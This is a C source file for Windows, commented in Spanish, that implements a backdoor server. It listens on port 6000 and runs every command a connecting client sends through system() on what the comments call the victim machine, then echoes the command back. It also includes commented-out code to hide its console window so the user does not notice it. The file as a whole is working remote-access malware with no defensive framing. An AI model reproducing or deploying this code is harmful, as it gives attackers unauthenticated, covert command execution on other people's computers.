//#define _WIN32_WINNT 0x0500  //para pasar el server a segundo plano y no ser percebido al ojo humano

#include <stdio.h>
#include <string.h>  //para manejar cadenas de caracteres usar funciones tipo strcat...
#include <winsock2.h> //manejar sockets
#pragma comment(lib, "ws2_32.lib") //Winsock Library
 
int main(int argc , char *argv[])
{
    //HWND hWnd = GetConsoleWindow();  //creamos el handle para manejar la ventana
   // ShowWindow( hWnd, SW_HIDE );     //escondemos la ventana del server para pasarla a segundo plano
    
    system("title SERVER CHEE && color 0a"); //estetica :)
    //inicializamos variables para crear sockets de posbles clientes
    WSADATA wsa;
    SOCKET master , new_socket , client_socket[5] , s;    
    struct sockaddr_in server, address;
    int max_clients = 5 , activity, addrlen, i, valread;  //vamos a crear el server para un maximo de 5 clientes
    char *message = "[+]Bienvenido a la España profunda!!! \r\n"; //mensaje de bienvenida
    char *messager = "\n[+]Comando ejecutado anteriormente en la maquina victima -> More details ... \r\n"; //mensaje de reply tras ejecucion de comandos
    
    int MAXRECV = 1024;  //Establecemos 1024 como tamaño maximo del buffer de recibir datos
    fd_set readfds;
    char *buffer; //declaramos puntero donde se recibiran los comandos a ejecutar del cliente
    buffer =  (char*) malloc((MAXRECV + 1) * sizeof(char)); //le asignamos a buffer el tamaño reservado con malloc
 a:    //colocamos esta sentencia para posteriormente hacer un goto a ella y crear un bucle en la conexion para que no se cierre
    for(i = 0 ; i < 5;i++)  //lanzamos un for para establecer maximo clientes permitidos y darles un index en el array client_socket para organizarlos del 0 al 4
    {
        client_socket[i] = 0;
    }
 
    printf("\n[+]Iniciando el temita...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("\n[+]Error!!! Code : %d",WSAGetLastError());
        exit(EXIT_FAILURE);
    }
     
    printf("\n[+]Inicializado satisfactoriamente!!!\n");
     
    if((master = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        printf("\n[+]Error al crear socket : %d" , WSAGetLastError());
        exit(EXIT_FAILURE);
    }
 
    printf("\n[+]Socket creado S/N.\n");
     
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons( 6000 );  //puerto donde escuchara el server para recibir conexiones de los clientes
     
    if( bind(master ,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)
    {
        printf("\n[+]Error code : %d" , WSAGetLastError());
        exit(EXIT_FAILURE);
    }
     
    puts("\n[+]Bind ready!!!");  
 
    //Listen to incoming connections
    listen(master , 3);
     
    puts("\n[+]Esperando conexiones entrantes...");
     
    addrlen = sizeof(struct sockaddr_in);
     
    while(TRUE) //establecemos bucle para que el server quede activo continuamente
    {
        FD_ZERO(&readfds);
        FD_SET(master, &readfds);
         
        for (  i = 0 ; i < max_clients ; i++) 
        {
            s = client_socket[i];
            if(s > 0)
            {
                FD_SET( s , &readfds);
            }
        }
         
        //Creamos una espera indefinida para la conexion de varios clientes
        activity = select( 0 , &readfds , NULL , NULL , NULL);
    
        if ( activity == SOCKET_ERROR ) 
        {
            printf("\n[+]Error code : %d" , WSAGetLastError());
            exit(EXIT_FAILURE);
        }
          
        //Preparamos para aceptar nuevas conexiones entrantes
        if (FD_ISSET(master , &readfds)) 
        {
            if ((new_socket = accept(master , (struct sockaddr *)&address, (int *)&addrlen))<0)
            {
                perror("\n[+]Accept");
                exit(EXIT_FAILURE);
            }
          
            //Informacion del socket del cliente
            printf("\n[+] Nueva conexion, socket fd %d , ip: %s  port: %d \n" , new_socket , inet_ntoa(address.sin_addr) , ntohs(address.sin_port));
        
            //enviamos mensaje de bienvenida
            if( send(new_socket, message, strlen(message), 0) != strlen(message) ) 
            {
                perror("\n[+]send failed");
            }else{
              
                    puts("\n[+]Por aqui estamos ready!!!");
                }
              
            //añadimos nueva conexion de un cliente al array de sockets
            for (i = 0; i < max_clients; i++) 
            {
                if (client_socket[i] == 0)
                {
                    client_socket[i] = new_socket;
                    printf("\n[+]Nueva conexion socket con index %d \n" , i);
                    break;
                }
            }
        }
          
        //else its some IO operation on some other socket :)
        for (i = 0; i < max_clients; i++)   //comprueba numero de clientes
        {
            s = client_socket[i];   //se especifica cliente que esta enviando comandos
            //si cliente envia datos al socket            
            if (FD_ISSET( s , &readfds)) 
            {
                //detalles del cliente
                getpeername(s , (struct sockaddr*)&address , (int*)&addrlen);
 
                //se reciben datos del cliente mediante recv 
                valread = recv( s , buffer, MAXRECV, 0);
                //establecemos flujos de errores
                if( valread == SOCKET_ERROR)
                {
                    int error_code = WSAGetLastError();
                    if(error_code == WSAECONNRESET)
                    {
                        //Si un cliente se desconecta se muestran detalles
                        printf("\n[+]Host desconectado ip %s port %d \n" , inet_ntoa(address.sin_addr) , ntohs(address.sin_port));
                      
                        //se cierra el socket y se marca como 0 en el array de conexiones para poder dejar entrar a un nuevo cliente.
                        closesocket( s );
                        client_socket[i] = 0;
                    }
                    else
                    {
                        printf("\n[+]recv failed with error code : %d" , error_code);
                        closesocket(s);
                        WSACleanup();
                        goto a;
                    }
                }
                if ( valread == 0)
                {
                    //cliente disconectado 
                    printf("\n[+]Host desconectado ip %s  port %d \n" , inet_ntoa(address.sin_addr) , ntohs(address.sin_port));
                      
                    //se cierra el socket y se marca como 0 en el array de conexiones para poder dejar entrar a un nuevo cliente.
                    closesocket( s );
                    client_socket[i] = 0;
                }else{
                    //add null character, if you want to use with printf/puts or other string handling functions
                    buffer[valread] = '\0';
                   
                    printf("\n\n[+]Ejecutando comando %s:%d - %s \n" , inet_ntoa(address.sin_addr) , ntohs(address.sin_port), buffer);
                    system(buffer);   //se ejecuta en la máquina el comando enviado por el cliente contenido en "buffer".
                    send(s, messager, strlen(messager), 0); //se envia al cliente el mensaje contenido en "messager" 
                    send( s , buffer , valread , 0 );   //se envia al cliente el comando ejecutado en la maquina victima contenido en "buffer"
                }
            }
        }
    }
     
    closesocket(s);  //se cierra socket si sale del bucle while(TRUE)
    WSACleanup();    //se limpian conexiones
     
    return 0;   //devuelve controles y libera asignaciones de memoria empleadas al procesador.
}
